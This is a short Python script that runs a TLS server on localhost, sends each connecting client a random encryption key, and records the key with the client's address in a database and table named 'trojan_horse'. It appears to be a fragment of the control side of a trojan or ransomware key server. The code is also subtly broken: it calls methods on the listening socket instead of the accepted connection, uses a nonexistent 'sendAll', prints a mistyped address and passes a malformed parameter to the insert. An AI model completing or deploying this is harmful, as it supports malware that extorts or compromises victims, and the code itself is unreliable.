import socket
import sqlite3
import ssl
import os

key = os.urandom(32)  # Generate a random key for encryption

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(certfile="server.crt", keyfile="server.key")
fSock = ctx.wrap_socket(sock, server_side=True)
fSock.bind(('127.0.0.1', 8080))
fSock.listen(1)
print("Server is listening on 127.0.1:8080")
conn , adr = fSock.accept()

ip, port = fSock.getpeername()
print(f"Connection established with {ip}:{port}")
fSock.sendAll(key)

print("Key sent to client")
if not os.path.exists("trojan_horse.db"):
    con = sqlite3.connect("trojan_horse.db")
    cur = con.cursor()
    print("Database not found, creating new one...")
    cur.execute("CREATE TABLE IF NOT EXISTS trojan_horse (id INTEGER PRIMARY KEY, data TEXT)")
    con.commit()
else:
    con = sqlite3.connect("trojan_horse.db")
    cur = con.cursor()

cur.execute("INSERT INTO trojan_horse (data) VALUES (?)", (f"for {ip}:{port}; {key}"))




